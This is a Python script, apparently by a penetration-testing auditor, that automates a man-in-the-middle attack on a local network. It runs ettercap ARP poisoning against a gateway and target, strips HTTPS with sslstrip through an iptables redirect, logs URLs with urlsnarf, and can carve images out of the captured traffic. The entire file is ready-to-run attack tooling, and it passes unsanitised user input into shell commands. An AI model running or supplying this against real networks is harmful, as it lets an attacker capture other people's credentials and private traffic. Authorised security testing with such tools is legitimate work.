#!/usr/bin/env python
'''
@author: Matthew C. Jones, CPA, CISA, OSCP
IS Audits & Consulting, LLC
TJS Deemer Dana LLP

Ettercap sniffer automation script

Plugin requires that ettercap run as root (uid = 0) and that IPTables parameters are
set up in etter.conf (/etc/ettercap/etter.conf)

sslstrip can be facilitated via ettercap plugin or via standalone ettercap application

'''

import os
import sys
import subprocess
import time


def clean_iptables():
    print("Restoring IPTables")
    subprocess.Popen("iptables --flush", shell=True).wait()
    subprocess.Popen("iptables --table nat --flush", shell=True).wait()
    subprocess.Popen("iptables --delete-chain", shell=True).wait()
    subprocess.Popen("iptables --table nat --delete-chain", shell=True).wait()
    
    print("Killing processes...")
    subprocess.Popen("killall sslstrip", shell=True).wait()
    subprocess.Popen("killall urlsnarf", shell=True).wait()


if os.getuid()!=0:
    print("Need root privileges to function properly; Re-run as sudo...")
    sys.exit()

start_wireshark = raw_input("Do you want to execute Wireshark and load capture when done? [no] \n")
if "y" in start_wireshark or "Y" in start_wireshark:
    start_wireshark = True
else:
    start_wireshark = False
    
start_tcpxtract = raw_input("Do you want to extract pictures from the pcap via tcpxtract [no] \n")
if "y" in start_tcpxtract or "Y" in start_tcpxtract:
    start_tcpxtract = True
else:
    start_tcpxtract = False
    
start_sslstrip = raw_input("Do you want to use sslstrip (select no to use ettercap for https downgrade - only works with ettercap 0.7.5 and later) [yes] \n")
if "n" in start_sslstrip or "N" in start_sslstrip:
    start_sslstrip = False
else:
    start_sslstrip = True
    
iface = raw_input("What interface to use (ie wlan0)?  \n")
session_name = raw_input("Enter session name (folder that will be created with all the log files) \n")
gateway_ip = raw_input("Enter gateway IP to poison (leave blank to poison whole network \n")
target_ip = raw_input("Enter target IP to poison (leave blank to poison whole network \n")

session_dir = "~/"+session_name
subprocess.Popen("mkdir "+session_dir, shell=True).wait()

clean_iptables()

accept_disclaimer = raw_input("Starting ettercap... \n\nIMPORTANT - USE 'q' to terminate so network gets re-arped!!! \nDo you understand?!?")
if "y" in accept_disclaimer or "Y" in accept_disclaimer:
    pass
else:
    print "\nI don't like your response, so I'm terminating the program to keep your skiddie ass from breaking something \n\n"
    sys.exit()

subprocess.Popen("urlsnarf -i "+iface+" | grep http > "+session_dir+"/urlsnarf.txt &", shell=True).wait()

if start_sslstrip == True:
    #Use standalone sslstrip application
    subprocess.Popen("sslstrip -p -f -l 8765 -w "+session_dir+"/sslstrip.log &", shell=True).wait()
    subprocess.Popen("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8765", shell=True).wait()
    time.sleep(5)   #make sure that other processes are started before kicking off ettercap
    subprocess.Popen("ettercap -T -i "+iface+" -w "+session_dir+"/ettercap.pcap -L "+session_dir+"/ettercap -M arp /"+gateway_ip+"/ /"+target_ip+"/", shell=True).wait()
else:
    #Use ettercap sslstrip plugin
    time.sleep(5)   #make sure that other processes are started before kicking off ettercap
    subprocess.Popen("ettercap -T -P sslstrip -i "+iface+" -w "+session_dir+"/ettercap.pcap -L "+session_dir+"/ettercap -M arp /"+gateway_ip+"/ /"+target_ip+"/", shell=True).wait()


clean_iptables()

subprocess.Popen("etterlog -p -i "+session_dir+"/ettercap.eci", shell=True).wait()

if start_wireshark == True:
    subprocess.Popen("wireshark "+session_dir+"/ettercap.pcap &", shell=True).wait()
    
if start_tcpxtract == True:
    subprocess.Popen("tcpxtract -f "+session_dir+"/ettercap.pcap", shell=True).wait()
    
print ("Done - don't forget to check the sslstrip log file as this data does not go to ettercap")